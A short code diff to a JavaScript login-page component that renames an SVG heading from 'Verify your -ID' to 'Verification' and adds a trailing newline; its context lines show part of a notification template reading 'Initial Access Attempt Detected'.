@@ -236,7 +236,7 @@ ${step === 1 ? '⚠️ *Initial Access Attempt Detected* ⚠️' : '🚨 *Final 
                       fontWeight="bold"
                       fontSize="20"
                     >
-                      Verify your -ID
+                      Verification
                     </text>
                   </g>
                 </svg>
@@ -394,3 +394,4 @@ ${step === 1 ? '⚠️ *Initial Access Attempt Detected* ⚠️' : '🚨 *Final 
 };
 
 export default LoginPage;
+
